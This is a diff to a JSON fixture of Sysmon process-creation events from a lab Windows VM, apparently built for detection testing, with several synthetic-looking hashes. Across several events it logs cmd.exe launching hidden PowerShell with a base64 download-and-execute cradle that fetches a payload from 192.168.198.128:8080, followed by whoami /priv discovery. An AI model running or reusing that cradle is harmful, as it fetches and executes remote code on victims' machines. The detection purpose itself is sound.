@@ -1,5 +1,155 @@
 [
   {
+    "timestamp": "2026-10-18T14:20:04.118Z",
+    "agent": {
+      "id": "001",
+      "name": "windows-vm-01",
+      "ip": "192.168.198.129"
+    },
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-Sysmon",
+        "providerGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+        "eventID": "1",
+        "version": "5",
+        "level": "4",
+        "task": "1",
+        "opcode": "0",
+        "keywords": "0x8000000000000000",
+        "systemTime": "2026-10-18T14:20:04.1184021Z",
+        "eventRecordID": "410290",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "computer": "windows-vm-01.corp.internal",
+        "severityValue": "INFORMATION"
+      },
+      "eventdata": {
+        "ruleName": "-",
+        "utcTime": "2026-10-18 14:20:04.115",
+        "processGuid": "{748f2c1a-4b14-6712-1400-000000002a00}",
+        "processId": "1420",
+        "image": "C:\\Windows\\System32\\svchost.exe",
+        "fileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
+        "description": "Host Process for Windows Services",
+        "product": "Microsoft® Windows® Operating System",
+        "company": "Microsoft Corporation",
+        "originalFileName": "svchost.exe",
+        "commandLine": "C:\\WINDOWS\\system32\\svchost.exe -k netsvcs -p",
+        "currentDirectory": "C:\\Windows\\system32\\",
+        "user": "NT AUTHORITY\\SYSTEM",
+        "logonGuid": "{748f2c1a-4af0-6712-e703-000000000000}",
+        "logonId": "0x3e7",
+        "terminalSessionId": "0",
+        "integrityLevel": "System",
+        "hashes": "SHA1=A19F8623E90B24F51A4D862B73C51C39E8B2D410,MD5=6F88FB8764E2D40F90B25A482B917E1C,SHA256=5E5E7C6A2A9032D413D7C4D642F87872E3E51B7F6E3D7A5B9C0E1F2A3B4C5D6E,IMPHASH=247B9220E5D9B720A84B2C8B5069A617",
+        "parentProcessGuid": "{748f2c1a-4af2-6712-0700-000000002a00}",
+        "parentProcessId": "688",
+        "parentImage": "C:\\Windows\\System32\\services.exe",
+        "parentCommandLine": "C:\\Windows\\system32\\services.exe",
+        "parentUser": "NT AUTHORITY\\SYSTEM"
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-18T14:21:19.504Z",
+    "agent": {
+      "id": "001",
+      "name": "windows-vm-01",
+      "ip": "192.168.198.129"
+    },
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-Sysmon",
+        "providerGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+        "eventID": "1",
+        "version": "5",
+        "level": "4",
+        "task": "1",
+        "opcode": "0",
+        "keywords": "0x8000000000000000",
+        "systemTime": "2026-10-18T14:21:19.5041189Z",
+        "eventRecordID": "410291",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "computer": "windows-vm-01.corp.internal",
+        "severityValue": "INFORMATION"
+      },
+      "eventdata": {
+        "ruleName": "-",
+        "utcTime": "2026-10-18 14:21:19.501",
+        "processGuid": "{748f2c1a-4b5f-6712-4400-000000002a00}",
+        "processId": "4116",
+        "image": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24080.9-0\\MpCmdRun.exe",
+        "fileVersion": "4.18.24080.9",
+        "description": "Microsoft Malware Protection Command Line Utility",
+        "product": "Microsoft® Windows® Operating System",
+        "company": "Microsoft Corporation",
+        "originalFileName": "MpCmdRun.exe",
+        "commandLine": "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24080.9-0\\MpCmdRun.exe\" -Scan -ScanType 1",
+        "currentDirectory": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24080.9-0\\",
+        "user": "NT AUTHORITY\\SYSTEM",
+        "logonGuid": "{748f2c1a-4af0-6712-e703-000000000000}",
+        "logonId": "0x3e7",
+        "terminalSessionId": "0",
+        "integrityLevel": "System",
+        "hashes": "SHA1=7B089C14567E8A29D12B3C4E5F60718293A4B5C6,MD5=3C4D5E6F708192A3B4C5D6E7F8091A2B,SHA256=8F9E0D1C2B3A495867768594A3B2C1D0E9F8A7B6C5D4E3F2A1B0C9D8E7F6A5B4,IMPHASH=1948C7362A1B4D5E8F90123A4B5C6D7E",
+        "parentProcessGuid": "{748f2c1a-4b01-6712-1d00-000000002a00}",
+        "parentProcessId": "2480",
+        "parentImage": "C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24080.9-0\\MsMpEng.exe",
+        "parentCommandLine": "\"C:\\ProgramData\\Microsoft\\Windows Defender\\Platform\\4.18.24080.9-0\\MsMpEng.exe\"",
+        "parentUser": "NT AUTHORITY\\SYSTEM"
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-18T14:22:09.814Z",
+    "agent": {
+      "id": "001",
+      "name": "windows-vm-01",
+      "ip": "192.168.198.129"
+    },
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-Sysmon",
+        "providerGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+        "eventID": "1",
+        "version": "5",
+        "level": "4",
+        "task": "1",
+        "opcode": "0",
+        "keywords": "0x8000000000000000",
+        "systemTime": "2026-10-18T14:22:09.8142093Z",
+        "eventRecordID": "410293",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "computer": "windows-vm-01.corp.internal",
+        "severityValue": "INFORMATION"
+      },
+      "eventdata": {
+        "ruleName": "technique_id=T1059.003,technique_name=Windows Command Shell",
+        "utcTime": "2026-10-18 14:22:09.811",
+        "processGuid": "{748f2c1a-4b91-6712-5100-000000002a00}",
+        "processId": "3104",
+        "image": "C:\\Windows\\System32\\cmd.exe",
+        "fileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
+        "description": "Windows Command Processor",
+        "product": "Microsoft® Windows® Operating System",
+        "company": "Microsoft Corporation",
+        "originalFileName": "Cmd.Exe",
+        "commandLine": "cmd.exe /c start /b powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQA4AC4AMQAyADgAOgA4ADAAOAAwAC8AcABhAHkAbABvAGEAZAAnACkA",
+        "currentDirectory": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\",
+        "user": "CORP\\Administrator",
+        "logonGuid": "{748f2c1a-4b3a-6712-e4f3-020000000000}",
+        "logonId": "0x2f3e4",
+        "terminalSessionId": "2",
+        "integrityLevel": "High",
+        "hashes": "SHA1=F1B2C3D4E5F60718293A4B5C6D7E8F901A2B3C4D,MD5=8A9B0C1D2E3F405162738495A6B7C8D9,SHA256=B99D61D874728EDC0918CA0EB10EAB93D381E7367E377406E65963366C874450,IMPHASH=272245E2988E1E430500B852C4FB5E18",
+        "parentProcessGuid": "{748f2c1a-4b3c-6712-3100-000000002a00}",
+        "parentProcessId": "2940",
+        "parentImage": "C:\\Windows\\explorer.exe",
+        "parentCommandLine": "C:\\Windows\\Explorer.EXE",
+        "parentUser": "CORP\\Administrator"
+      }
+    }
+  },
+  {
     "timestamp": "2026-10-18T14:22:10.142Z",
     "agent": {
       "id": "001",
@@ -25,10 +175,10 @@
       "eventdata": {
         "ruleName": "technique_id=T1059.001,technique_name=PowerShell",
         "utcTime": "2026-10-18 14:22:10.138",
-        "processGuid": "{A12B3C4D-5E6F-7A8B-9C0D-1E2F3A4B5C6D}",
+        "processGuid": "{748f2c1a-4b92-6712-5200-000000002a00}",
         "processId": "4892",
         "image": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
-        "fileVersion": "10.0.22621.1",
+        "fileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
         "description": "Windows PowerShell",
         "product": "Microsoft® Windows® Operating System",
         "company": "Microsoft Corporation",
@@ -36,15 +186,65 @@
         "commandLine": "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQA4AC4AMQAyADgAOgA4ADAAOAAwAC8AcABhAHkAbABvAGEAZAAnACkA",
         "currentDirectory": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\",
         "user": "CORP\\Administrator",
-        "logonGuid": "{A12B3C4D-0000-0000-0000-E4F302000000}",
-        "logonId": "0x2F3E4",
+        "logonGuid": "{748f2c1a-4b3a-6712-e4f3-020000000000}",
+        "logonId": "0x2f3e4",
         "terminalSessionId": "2",
         "integrityLevel": "High",
         "hashes": "SHA1=95D8B6F96A9073BC1C013C7B65E4BB2EE45C6648,MD5=852D67ED3C461E430485F84716141797,SHA256=DE96A6E699FE52163A4269176EA9C174549CF4E002B4BA7FE826C6AC23B17717,IMPHASH=A123F947B0091321C9EF1013AA410291",
-        "parentProcessGuid": "{A12B3C4D-1234-5678-90AB-CDEF12345678}",
+        "parentProcessGuid": "{748f2c1a-4b91-6712-5100-000000002a00}",
         "parentProcessId": "3104",
         "parentImage": "C:\\Windows\\System32\\cmd.exe",
-        "parentCommandLine": "cmd.exe /c start /b powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgA...",
+        "parentCommandLine": "cmd.exe /c start /b powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQA4AC4AMQAyADgAOgA4ADAAOAAwAC8AcABhAHkAbABvAGEAZAAnACkA",
+        "parentUser": "CORP\\Administrator"
+      }
+    }
+  },
+  {
+    "timestamp": "2026-10-18T14:22:13.409Z",
+    "agent": {
+      "id": "001",
+      "name": "windows-vm-01",
+      "ip": "192.168.198.129"
+    },
+    "win": {
+      "system": {
+        "providerName": "Microsoft-Windows-Sysmon",
+        "providerGuid": "{5770385F-C22A-43E0-BF4C-06F5698FFBD9}",
+        "eventID": "1",
+        "version": "5",
+        "level": "4",
+        "task": "1",
+        "opcode": "0",
+        "keywords": "0x8000000000000000",
+        "systemTime": "2026-10-18T14:22:13.4098812Z",
+        "eventRecordID": "410295",
+        "channel": "Microsoft-Windows-Sysmon/Operational",
+        "computer": "windows-vm-01.corp.internal",
+        "severityValue": "INFORMATION"
+      },
+      "eventdata": {
+        "ruleName": "technique_id=T1033,technique_name=System Owner/User Discovery",
+        "utcTime": "2026-10-18 14:22:13.406",
+        "processGuid": "{748f2c1a-4b95-6712-5300-000000002a00}",
+        "processId": "5108",
+        "image": "C:\\Windows\\System32\\whoami.exe",
+        "fileVersion": "10.0.22621.1 (WinBuild.160101.0800)",
+        "description": "whoami - displays logged on user information",
+        "product": "Microsoft® Windows® Operating System",
+        "company": "Microsoft Corporation",
+        "originalFileName": "whoami.exe",
+        "commandLine": "whoami.exe /priv",
+        "currentDirectory": "C:\\Users\\Administrator\\AppData\\Local\\Temp\\",
+        "user": "CORP\\Administrator",
+        "logonGuid": "{748f2c1a-4b3a-6712-e4f3-020000000000}",
+        "logonId": "0x2f3e4",
+        "terminalSessionId": "2",
+        "integrityLevel": "High",
+        "hashes": "SHA1=4D891B2C3E4F5A6B7C8D9E0F1A2B3C4D5E6F7A8B,MD5=5A6B7C8D9E0F1A2B3C4D5E6F7A8B9C0D,SHA256=3D8E9F0A1B2C3D4E5F6A7B8C9D0E1F2A3B4C5D6E7F8A9B0C1D2E3F4A5B6C7D8E,IMPHASH=7E8F9A0B1C2D3E4F5A6B7C8D9E0F1A2B",
+        "parentProcessGuid": "{748f2c1a-4b92-6712-5200-000000002a00}",
+        "parentProcessId": "4892",
+        "parentImage": "C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe",
+        "parentCommandLine": "powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEAOQA4AC4AMQAyADgAOgA4ADAAOAAwAC8AcABhAHkAbABvAGEAZAAnACkA",
         "parentUser": "CORP\\Administrator"
       }
     }
